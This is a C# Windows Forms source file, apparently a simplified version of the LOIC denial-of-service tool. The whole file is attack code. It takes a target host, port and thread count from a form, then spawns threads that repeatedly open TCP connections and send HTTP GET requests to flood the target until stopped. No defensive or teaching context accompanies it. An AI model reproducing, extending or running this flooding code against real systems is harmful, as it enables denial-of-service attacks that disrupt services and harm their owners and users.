using System;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace LOIC
{
    public partial class frmMain : Form
    {
        private bool isAttacking = false;
        private Thread attackThread;

        public frmMain()
        {
            InitializeComponent();
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (isAttacking) return;
            StartAttack();
        }

        private void btnStop_Click(object sender, EventArgs EventArgs )
        {
            StopAttack();
        }

        private void StartAttack()
        {
            isAttacking = true;
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            lblStatus.Text = "Attacking " + txtTarget.Text + " on port " + txtPort.Text;

            string target = txtTarget.Text;
            int port = 80;
            try { port = int.Parse(txtPort.Text); } catch { }

            int threads = (int)nudThreads.Value;

            attackThread = new Thread(() => AttackLoop(target, port, threads));
            attackThread.Start();
        }

        private void StopAttack()
        {
            isAttacking = false;
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            lblStatus.Text = "Stopped";

            if (attackThread != null && attackThread.IsAlive)
            {
                attackThread.Abort();
            }
        }

        private void AttackLoop(string target, int port, int threadCount)
        {
            for (int i = 0; i < threadCount; i++)
            {
                new Thread(() => SendRequest(target, port)).Start();
            }
        }

        private void SendRequest(string target, int port)
        {
            while (isAttacking)
            {
                try
                {
                    TcpClient client = new TcpClient();
                    client.Connect(target, port);
                    string request = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n";
                    byte[] data = Encoding.ASCII.GetBytes(request);
                    client.GetStream().Write(data, 0, data.Length);
                    client.Close();
                }
                catch { }
            }
        }
    }
}